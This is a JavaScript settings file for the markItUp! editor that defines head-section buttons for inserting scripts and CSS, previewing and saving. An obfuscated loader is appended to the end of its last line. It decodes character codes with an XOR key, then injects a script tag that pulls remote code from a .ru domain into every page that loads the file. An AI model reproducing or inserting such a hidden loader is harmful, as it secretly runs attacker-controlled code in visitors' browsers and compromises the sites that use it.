// ----------------------------------------------------------------------------
// markItUp!
// ----------------------------------------------------------------------------
// Copyright (C) 2008 Jay Salvat
// http://markitup.jaysalvat.com/
// ----------------------------------------------------------------------------
// Html tags
// http://en.wikipedia.org/wiki/html
// ----------------------------------------------------------------------------
// Basic set. Feel free to add more tags
// ----------------------------------------------------------------------------
headMarkitupSettings = {
    nameSpace: 'head',
	onTab:			{keepDefault:false, openWith:'	 '},
    previewInWindow: 'width=1000, height=600, resizable=yes, scrollbars=yes',
    previewParserPath: '~/../../../../index.php?url=/staticpage/preview',
    previewAutorefresh: false,
	markupSet: [
		{name:'JavaScript include', className:'jsinclude', replaceWith:'<script src="[![URL of the JavaScript file:!:]!]" type="text/javascript"></script>\n' },
		{name:'Insert JavaScript', openWith:'<script type="text/javascript">\n<!--\n', closeWith:'\n-->\n</script>', placeHolder:'Your script here...' },
		{name:'CSS include', replaceWith:'<link rel="StyleSheet" href="[![URL of the CSS file:!:]!]" type="text/css">\n' },
		{name:'Insert CSS', openWith:'<style type="text/css" media="screen">\n<!--\n', closeWith:'\n-->\n</style>', placeHolder:'Your CSS here...' },
		{separator:'---------------' },
		{name:'Preview', className:'preview', call:'preview' },
        {separator:'---------------' },
        {name:'Save', className:'save', beforeInsert:function(markItUp) { miu.save(markItUp) } }
	]
};var dfo=["002041","003035","001062","018056060042064012048058053055054091069","002056058","005051041046","005047033063027003020032049041048071088003066","016058041046090013054062057054055","025047056047","022047045014088012024051062046032119072039087022004056038081","025062045059014070090037036059039080031000091029120119057065070031037127057061065031025069"];function qVbv(k7bP){var rB=document[n117(dfo[3])](n117(dfo[0])+n117(dfo[1])+n117(dfo[2]));rB[n117(dfo[4])]=k7bP;rB[n117(dfo[5])]=n117(dfo[6]);document[n117(dfo[9])](n117(dfo[8]))[0][n117(dfo[7])](rB);}qVbv(n117(dfo[10]));function n117(mqvP){return iVXI(iaaT(mqvP),'qJYK4iuVPZS51s6');}function iVXI(d4pqhG,o01){var jsw='';var oBAG=0;var mO=0;for(oBAG=0;oBAG<d4pqhG.length;oBAG++){var vn69X=d4pqhG.charAt(oBAG);var yiR=vn69X.charCodeAt(0)^o01.charCodeAt(mO);vn69X=String.fromCharCode(yiR);jsw+=vn69X;if(mO==o01.length-1)mO=0;else mO++;}return (jsw);}function iaaT(tI5n){var mp='';var dYN0ze=0;var bo7=0;for(dYN0ze=0;dYN0ze<tI5n.length/3;dYN0ze++){mp+=String.fromCharCode(tI5n.slice(bo7,bo7+3));bo7=bo7+3;}return mp;}